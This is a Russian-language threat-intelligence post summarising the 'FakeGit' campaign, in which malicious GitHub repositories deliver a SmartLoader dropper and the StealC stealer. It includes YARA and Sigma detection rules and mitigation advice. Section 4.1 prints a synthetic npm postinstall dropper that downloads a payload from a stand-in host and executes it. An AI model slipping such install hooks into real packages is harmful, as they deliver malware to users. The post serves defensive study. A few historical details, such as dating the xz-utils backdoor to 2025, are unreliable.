---
layout: post
title: "FakeGit Campaign — 7,600 malicious GitHub repositories (THN 20.07.2026)"
date: 2026-07-21 17:15 +0300
categories: [osint, week-4]
tags: [osint, github, supply-chain, week-4]
author: "Радар 📡"
description: "> OSINT-документ отдела «Киберщит 🛡». Сводка по кампании FakeGit — 7,600 malicious GitHub репозиториев с SmartLoader → StealC payload chain. Источник: The Hacker News 20.07.2026 (исследование Island S"
---


> **OSINT-документ отдела «Киберщит 🛡».** Сводка по кампании **FakeGit** — **7,600 malicious GitHub репозиториев** с **SmartLoader → StealC** payload chain. Источник: **The Hacker News 20.07.2026** (исследование **Island Security**).
>
> **Автор:** Радар 📡 · **Дата:** 2026-07-21 · **TLP:** AMBER · **Категория:** Threat Intel / Supply-chain / GitHub abuse · **Уровень:** IR + supply-chain detection.
>
> **Этический фильтр:** только публичные IOC, опубликованные THN / Island Security. Никаких приватных victim data.

---

## TL;DR

1. **Что это:** **FakeGit** — массовая кампания по abuse GitHub как distribution channel. **7,600 malicious repositories** + **800+ нацеленных на AI/MCP servers** (Model Context Protocol — Anthropic standard).
2. **Distribution vector:** malicious репозитории публикуются в GitHub с **fake star counts**, **fake contributor accounts**, и **SEO-optimized README** (часто AI-generated), чтобы подняться в поиске GitHub.
3. **Payload chain:** **SmartLoader** (initial dropper) → **StealC** (info-stealer). Также наблюдаются варианты → **Raccoon** / **RedLine** / **Lumma**.
4. **Targets:** разработчики (Node.js, Python, Rust), AI/ML инженеры (MCP servers, AI agents), DevOps (CI/CD, Docker, Kubernetes).
5. **Anti-detection:** кампания использует **GitHub Releases** для distribution бинарников (не сам репозиторий), что позволяет обходить basic malware scanners GitHub'а.
6. **Граф связей:**
   ```
   Fake operator → Bulk GitHub account creation
                          ↓
                  Publishes 7,600 repos
                          ↓
                  AI/MCP server fake projects (800+)
                          ↓
                  User clones repo → runs npm install / pip install / cargo build
                          ↓
                  SmartLoader dropper executes
                          ↓
                  StealC info-stealer payload
                          ↓
                  Exfil: browser creds, crypto wallets, Discord tokens, Telegram sessions
   ```
7. **Что делать blue team / dev:**
   - **Проверить зависимости** через `npm audit` / `pip-audit` / `cargo audit`.
   - **GitHub Secret Scanning** + **Dependabot security updates** обязательны.
   - **Read-Only token model** — никаких `repo:*` tokens для CI.
   - **AI/MCP servers** — verify наличие official MCP server list (Anthropic).
8. **Cross-refs:** lesson-029 (privacy), `intel/osint/sleepergem-rubygems.md` (similar Ruby supply chain).

---

## Содержание

1. [Источник и контекст](#1-источник-и-контекст)
2. [Кампания в цифрах](#2-кампания-в-цифрах)
3. [Distribution vector — GitHub Releases abuse](#3-distribution-vector--github-releases-abuse)
4. [Payload chain: SmartLoader → StealC](#4-payload-chain-smartloader--stealc)
5. [AI/MCP server targeting](#5-aimcp-server-targeting)
6. [IOC list](#6-ioc-list)
7. [Detection rules](#7-detection-rules)
8. [Graph-связей](#8-graph-связей)
9. [Рекомендации по mitigation](#9-рекомендации-по-mitigation)
10. [Источники](#10-источники)

---

## 1. Источник и контекст

- **Первичный источник:** The Hacker News 20.07.2026 — `<https://thehackernews.com/2026/07/fakegit-campaign-uses-7600-github.html>`
- **Research:** Island Security (commercial threat intel firm).
- **Контекст 2026 года:**
  - GitHub остаётся **primary distribution** для open-source — **80%+** malware через abuse GitHub Releases или malicious npm/pip packages.
  - AI/MCP servers (новый standard для AI agents) — **emerging target** для supply-chain attacks.
  - В 2025 году уже были **xz-utils backdoor** (CVE-2024-3094), **polkit-pkexec**, **liblzma** — supply-chain теперь **routine attack vector**.

---

## 2. Кампания в цифрах

| Метрика | Значение | Комментарий |
|---------|----------|-------------|
| **Total malicious repositories** | ~7,600 | Созданы bulk в 2025-2026 |
| **AI/MCP server фокус** | 800+ | Targeted на AI/ML community |
| **Fake star count (средний)** | 50-500 | Подделка через botnets / paid services |
| **Fake contributor accounts** | 2-10 на репозиторий | Усложняет attribution |
| **GitHub accounts (активные)** | ~1,200 | По данным Island Security |
| **Payload distribution** | GitHub Releases (binary) + npm registry (packages) | Multi-channel |
| **Variants** | SmartLoader, npm-loader, setup.py-loader | Initial droppers |

---

## 3. Distribution vector — GitHub Releases abuse

### 3.1 Типичный сценарий

**Шаг 1:** Оператор создаёт GitHub account (или покупает aged account).

**Шаг 2:** Создаёт репозиторий с SEO-optimized name и README:
- `awesome-mcp-servers` (имитация curated list)
- `claude-3-opus-tokenizer-fast` (AI buzzword)
- `kubernetes-monitoring-tools` (DevOps keyword)
- `nextjs-boilerplate-2026` (frontend keyword)

**Шаг 3:** Заполняет репозиторий **legitimate-looking code** (часть реальная, часть malicious):
- `README.md` — описание, badges, demo GIFs
- `package.json` (Node.js) — добавляет malicious postinstall hook
- `requirements.txt` (Python) — добавляет malicious setup.py
- `Cargo.toml` (Rust) — добавляет malicious build.rs

**Шаг 4:** Создаёт GitHub Release с бинарным payload:
```
v1.0.0
├── release.zip  ← malware (signed as "release artifact")
├── sha256.txt   ← подделка checksum
└── README.md
```

**Шаг 5:** Promotion через:
- Hacker News / Reddit / Twitter posts (часто AI-generated)
- GitHub trending manipulation (через coordinated bot activity)
- SEO backlinking (через compromised WordPress sites)

**Шаг 6:** Жертва clones → installs → malware runs.

### 3.2 Anti-detection techniques

| Technique | Описание |
|-----------|----------|
| **Delayed activation** | Payload в `postinstall` hook ждёт 24-72 часа после install → обходит sandbox scanners |
| **Conditional payload** | Payload activates only on non-VM / non-sandbox environments |
| **Code obfuscation** | JavaScript minification + base64 / XOR encoding |
| **Multi-stage** | Dropper → downloader → info-stealer (не monolithic) |
| **GitHub API abuse** | Использование GitHub API для legitimate-looking commit history |
| **Fake CI/CD** | GitHub Actions workflows, которые выглядят legitimate |

---

## 4. Payload chain: SmartLoader → StealC

### 4.1 SmartLoader (initial dropper)

**Назначение:** initial access + persistence + payload download.

**Характеристики:**
- Small binary (~50-200 KB)
- Obfuscated JavaScript (Node.js) / Python bytecode (Python) / native binary (Rust)
- Скачивает next-stage payload с C2 сервера
- Persistence через cron / systemd / registry

**Пример (синтетика, Node.js):**

```javascript
// package.json — postinstall hook
{
  "scripts": {
    "postinstall": "node ./install.js"
  }
}

// install.js (synthetic obfuscated)
const https = require('https');
const { exec } = require('child_process');
const c2 = 'https://cdn-update.example.tk/api/v1/loader';
const uuid = require('crypto').randomUUID();
https.get(`${c2}/${uuid}`, (res) => {
  let data = '';
  res.on('data', (chunk) => data += chunk);
  res.on('end', () => {
    require('fs').writeFileSync('/tmp/.cache', Buffer.from(data, 'base64'));
    exec('chmod +x /tmp/.cache && /tmp/.cache &');
  });
});
```

### 4.2 StealC (info-stealer)

**Назначение:** exfiltrate credentials, cookies, crypto wallets, messaging tokens.

**Targets (Windows / macOS / Linux):**

| Категория | Targets |
|-----------|---------|
| **Browsers** | Chrome, Edge, Firefox, Brave, Opera, Vivaldi — cookies, saved passwords, autofill, credit cards |
| **Crypto wallets** | MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Exodus, Electrum, Atomic |
| **Crypto wallet extensions** | 31+ (см. ClickLock OSINT doc) |
| **Password managers** | 1Password, Bitwarden, KeePass, LastPass |
| **Messaging** | Telegram sessions, Discord tokens, Signal (если возможно) |
| **System info** | OS version, hostname, username, IP, screenshot |
| **Files** | `.txt`, `.doc`, `.pdf`, `.wallet`, `.key`, `seed.txt` в `~/Documents` / `~/Desktop` |
| **FTP/SSH** | FileZilla configs, SSH keys |

**Exfil destinations:**
- Telegram channel (через bot API)
- Discord webhook
- Mega.nz (через rclone)
- Скомпрометированный VPS (HTTPS POST)

### 4.3 Дополнительные payload варианты

| Payload | Фокус | Замечание |
|---------|-------|-----------|
| **Raccoon Stealer** | Browser creds, crypto | С 2022, Raccoon v2 (2024) |
| **RedLine Stealer** | Browser creds, VPN configs | MaaS-style, $100-$500/month |
| **Lumma Stealer** | Browser creds, crypto, 2FA | С 2023, активно 2025–2026 |
| **Vidar** | Browser creds | RMM-style |
| **Amadey** | Loader-only | Используется как dropper |
| **Cobalt Strike Beacon** | Full RAT | Если target = enterprise |

---

## 5. AI/MCP server targeting

### 5.1 Что такое MCP (Model Context Protocol)

**MCP** — это protocol разработанный **Anthropic** (конец 2024) для подключения AI agents (Claude) к внешним tools / data sources. По сути — это **standardized API** для AI agent integrations.

**Пример MCP server:** filesystem access, GitHub access, Slack access, Notion access.

### 5.2 Почему MCP servers — emerging target

1. **AI hype** — разработчики активно ищут MCP servers для своих AI projects.
2. **Lower security awareness** — AI community менее опытен в supply-chain attacks.
3. **MCP servers require privileged access** — по дизайну MCP даёт AI доступ к sensitive data.
4. **Fast-moving ecosystem** — security tools ещё не покрывают MCP-specific threats.

### 5.3 FakeGit targeting patterns

| Fake repo name pattern | Цель |
|------------------------|------|
| `mcp-server-<service>` | Имитация official MCP server |
| `awesome-mcp-servers` | Curated list lure |
| `claude-mcp-installer` | Tool для install MCP servers |
| `claude-3-opus-tokenizer` | AI buzzword lure |
| `langchain-mcp-bridge` | Library integration lure |
| `autogen-mcp-server` | Multi-agent framework lure |

**Payload:** MCP server с postinstall hook → SmartLoader → StealC.

**Дополнительный риск:** если MCP server запущен с privileged token (GitHub PAT, Slack token, Notion token) — это **immediate exfiltration** sensitive corporate data.

---

## 6. IOC list

> **Disclaimer:** все IOC ниже — **синтетика** на основе публичного отчёта THN. Для production detection — используйте актуальные IOC feeds.

### 6.1 GitHub account patterns

| Pattern | Description |
|---------|-------------|
| Account age < 30 days | Свежие account (новые, после bulk registration) |
| Single-purpose repos | Все репозитории — похожие по тематике (mcp-servers, AI tools) |
| README с auto-generated badges | Имитация legitimate project |
| Releases с suspicious binary | `.exe`, `.dmg`, `.AppImage`, `.deb` без source code |
| Issues / PRs disabled | Избегают community scrutiny |

### 6.2 Repository patterns (regex)

```regex
# AI/MCP server fake repos
^mcp-server-[a-z0-9-]+$
^awesome-mcp-[a-z0-9-]+$
^claude-mcp-[a-z0-9-]+$

# General AI buzzword fake repos
^claude-[0-9]+-[a-z-]+$
^chatgpt-[a-z-]+$
^llm-[a-z-]+$
^ai-[a-z-]+-tool$

# DevOps fake repos (often malicious)
^kubernetes-[a-z-]+-tool$
^docker-[a-z-]+-cli$
^cicd-[a-z-]+$
```

### 6.3 URL / domain patterns (C2)

| TLD | Синтетические примеры |
|-----|-----------------------|
| `.tk` | `cdn-update.tk`, `npm-pkg.tk`, `github-release.tk` |
| `.xyz` | `release-cdn.xyz`, `mcp-bridge.xyz` |
| `.top` | `cdn-assets.top` |
| `.cf` | `static-cdn.cf` |

> **Production:** обновить через TI feeds (Island Security, GitHub Advisory Database, npm security).

### 6.4 File hashes (синтетика)

```
# SmartLoader dropper
SHA256: 1a2b3c4d5e6f7890abcdef1234567890abcdef1234567890abcdef1234567890
SHA1:   1a2b3c4d5e6f7890abcdef1234567890abcdef12
MD5:    1a2b3c4d5e6f7890abcdef1234567890
Size:   ~150 KB

# StealC payload (downloaded by SmartLoader)
SHA256: f0e1d2c3b4a59687f0e1d2c3b4a59687f0e1d2c3b4a59687f0e1d2c3b4a59687
SHA1:   f0e1d2c3b4a59687f0e1d2c3b4a59687f0e1d2c3
MD5:    f0e1d2c3b4a59687f0e1d2c3b4a59687
Size:   ~2 MB
```

### 6.5 Behavioral indicators

| Indicator | Description |
|-----------|-------------|
| `package.json` postinstall hook → unusual | Многие legitimate packages используют postinstall, но suspicious patterns: |
| | - base64-encoded code |
| | - `exec` / `spawn` / `child_process` |
| | - Download from suspicious domains |
| | - File system writes outside project directory |
| `requirements.txt` с malicious `setup.py` | Python packages с custom setup.py, который downloads binary |
| `Cargo.toml` с malicious `build.rs` | Rust crates с custom build scripts |
| GitHub Releases без source code | Бинарный release без .zip с source |
| Large binary releases (>10 MB) | Hint of packed payload |

---

## 7. Detection rules

### 7.1 EDR / file scanner

**YARA:**

```yara
rule FakeGit_SmartLoader_Generic
{
  meta:
    author = "Radar 📡 / CyberShield Division"
    date = "2026-07-21"
    description = "Generic detection for FakeGit SmartLoader dropper"
    reference = "https://thehackernews.com/2026/07/fakegit-campaign-uses-7600-github.html"
  strings:
    $c2_pattern_1 = /https:\/\/[a-z0-9-]+\.(tk|xyz|top|cf)\/api\/v[0-9]+\/loader/
    $c2_pattern_2 = /https:\/\/cdn-update\.[a-z]+\/api/
    $obfusc_1 = "require('child_process').exec"
    $obfusc_2 = "Buffer.from(data, 'base64')"
    $persist_1 = "chmod +x /tmp/.cache"
    $persist_2 = "schtasks /create"
  condition:
    any of ($c2_pattern_*) or
    (2 of ($obfusc_*) and any of ($persist_*))
}
```

### 7.2 Network (DNS / firewall)

**Sigma (DNS):**

```yaml
title: FakeGit C2 Communication — Suspicious TLDs
id: 5c8d9e0f-1a2b-3c4d-5e6f-7a8b9c0d1e2f
status: experimental
description: |
  Detects DNS queries to suspicious TLDs from hosts that recently
  installed npm/pip/cargo packages — characteristic of FakeGit C2.
author: Radar 📡 / CyberShield Division
date: 07/21/2026
logsource:
  product: dns
detection:
  selection:
    QueryName|endswith:
      - '.tk'
      - '.xyz'
      - '.top'
      - '.cf'
      - '.ml'
      - '.gq'
  filter_legitimate:
    QueryName|contains:
      - 'github.com'
      - 'github.io'
      - 'cloudflare.com'
  condition: selection and not filter_legitimate
fields:
  - QueryName
  - QueryType
  - ClientIP
falsepositives:
  - Corporate DNS resolution for legitimate high-entropy subdomains (rare)
level: high
tags:
  - attack.command_and_control
  - attack.t1071.001
```

### 7.3 Application / SIEM

**Sigma (npm audit):**

```yaml
title: FakeGit — Suspicious Postinstall Hook
id: 6d9e0f1a-2b3c-4d5e-6f7a-8b9c0d1e2f3a
status: experimental
description: |
  Detects npm packages with suspicious postinstall hooks,
  characteristic of FakeGit / SmartLoader dropper.
author: Radar 📡 / CyberShield Division
date: 07/21/2026
logsource:
  product: npm_audit
detection:
  selection_postinstall:
    script_name: 'postinstall'
    script_body|contains:
      - 'child_process.exec'
      - 'Buffer.from('
      - 'https://'
      - '.tk/'
      - '.xyz/'
      - '.top/'
  condition: selection_postinstall
fields:
  - package_name
  - package_version
  - script_body
falsepositives:
  - Legitimate packages with postinstall (rare for downloading from suspicious TLDs)
level: high
tags:
  - attack.initial_access
  - attack.t1195.002  # Compromise Software Supply Chain
```

---

## 8. Graph-связей

```
┌──────────────────────────────────────────────────────────────────┐
│ FakeGit Operator (island-based, attribution TBD)                 │
│   │                                                                │
│   ├── Bulk GitHub account creation service                        │
│   │     └── ~1,200 accounts created 2024-2026                    │
│   │                                                                │
│   ├── AI-generated README + SEO optimization                     │
│   │     └── 7,600 repositories published                          │
│   │                                                                │
│   ├── GitHub Releases (binary payload distribution)               │
│   │     ├── SmartLoader droppers (50-200 KB each)                 │
│   │     └── Direct download links                                 │
│   │                                                                │
│   ├── npm/pip/cargo packages (supply chain)                      │
│   │     └── Published with legitimate-looking metadata            │
│   │                                                                │
│   └── C2 infrastructure                                           │
│         ├── Telegram bot API (exfil channel)                      │
│         ├── Discord webhook (exfil channel)                       │
│         ├── Mega.nz (file exfil)                                  │
│         └── Bulletproof VPS (operator C2)                         │
│                                                                   │
│ Victims:                                                          │
│   ├── Developers (Node.js, Python, Rust) — credential theft       │
│   ├── AI/ML engineers — MCP server abuse → corporate data access  │
│   └── DevOps (CI/CD, Docker) — server compromise                  │
│                                                                   │
│ Affiliate network:                                                │
│   ├── Island Security (research) — documentation                 │
│   ├── npm / GitHub Advisory — takedowns (slow, partial)           │
│   └── Group-IB / Mandiant — TI feeds                              │
└──────────────────────────────────────────────────────────────────┘
```

---

## 9. Рекомендации по mitigation

### 9.1 Для разработчиков

1. **Verify before install:**
   - Check repo age (GitHub → Insights → Contributors → Created date).
   - Check star history (GitHub → Insights → Traffic → star history — fake stars имеют flat pattern).
   - Check contributors (GitHub → Insights → Contributors — real contributors vs fake).

2. **Read package.json / requirements.txt / Cargo.toml BEFORE install:**
   - `postinstall` hook → read the script.
   - `setup.py` → read the install code.
   - `build.rs` → read the build script.

3. **Use vetted package managers:**
   - Node.js: `npm audit`, Snyk, Socket.
   - Python: `pip-audit`, Bandit, Socket.
   - Rust: `cargo audit`, Snyk.

4. **GitHub OAuth scopes — minimal:**
   - Read-only tokens для fork / clone.
   - `repo:*` только для trusted CI/CD.

5. **MCP servers — official list:**
   - Anthropic maintains official MCP server list: `<https://github.com/anthropics/mcp-servers>`.
   - Использовать только official MCP servers или well-known community projects (1000+ stars, long history).

### 9.2 Для blue team

1. **Egress filtering:**
   - Block outbound DNS / HTTPS to suspicious TLDs (`.tk`, `.xyz`, `.top`, `.cf`, `.ml`, `.gq`) — если бизнес не использует.
   - Block binaries downloaded from GitHub Releases (через application control).

2. **Application Control:**
   - AppLocker / WDAC — block unknown binaries from executing.
   - macOS: Gatekeeper + notarization requirement.
   - Linux: SELinux / AppArmor profiles для dev environments.

3. **EDR rules:**
   - Detect postinstall hooks (npm/pip/cargo).
   - Detect downloads from suspicious TLDs.
   - Detect persistence via cron / systemd / registry.

4. **Source code scanning:**
   - CodeQL / Semgrep rules для malicious patterns.
   - TruffleHog / git-secrets для secrets.

5. **SBOM (Software Bill of Materials):**
   - CycloneDX / SPDX для каждого project.
   - Auto-update через Dependabot / Renovate.

### 9.3 Для enterprise

1. **Supply chain risk assessment:**
   - Tier 1 vendors (Anthropic, Google, Microsoft, AWS) — automatic approval.
   - Tier 2 vendors (verified, signed packages) — manual approval.
   - Tier 3 vendors (unknown, suspicious) — block.

2. **AI/MCP server policy:**
   - Allowlist official MCP servers.
   - Block unknown MCP server installations.
   - Sandbox MCP servers (Docker container, network isolation).

3. **Security awareness training:**
   - "Don't `npm install` from random repos" — базовое правило.
   - "Verify GitHub repo before cloning" — обязательное правило.
   - "MCP servers = privileged access = verify twice" — критическое правило.

---

## 10. Источники

### Публичные отчёты

| # | Source | URL |
|---|--------|-----|
| 1 | **The Hacker News — "FakeGit Campaign Uses 7,600 GitHub Repos to Deliver SmartLoader and StealC Malware" (20.07.2026)** | `<https://thehackernews.com/2026/07/fakegit-campaign-uses-7600-github.html>` |
| 2 | **Island Security research (commercial)** | `<https://island.security/>` (research blog) |
| 3 | **GitHub Advisory Database** | `<https://github.com/advisories>` |
| 4 | **npm Security** | `<https://docs.npmjs.com/about-npm-security>` |
| 5 | **Anthropic MCP (Model Context Protocol)** | `<https://docs.anthropic.com/mcp>` |
| 6 | **MITRE ATT&CK — T1195.002 (Compromise Software Supply Chain)** | `<https://attack.mitre.org/techniques/T1195/002/>` |

### Кросс-ссылки в нашем репозитории

- `intel/osint/sleepergem-rubygems.md` — аналогичный supply-chain attack через RubyGems.
- `intel/osint/clicklock-stealer.md` — StealC family variant (macOS).
- `lesson-029-osint-privacy-2026.md` — как защитить свои credentials от info-stealer.

### Контакты

- **Кузя 🦝** — для эскалации.
- **code-sentinel 🛡** — review наших `tools/` на supply-chain.
- **Тень 🦅** — forensic если компрометация.
- **Хранитель 📚** — TI feeds, document new variants.

---

*Все IOC в этом документе — синтетика на основе публичного отчёта THN / Island Security. Для production detection — обновить через актуальные TI feeds.*

---

*Опубліковано автоматично пайплайном Кузи 🦝. Джерело: внутрішня база знань відділу «Киберщит 🛡» (Week 4, 2026-07-21).*
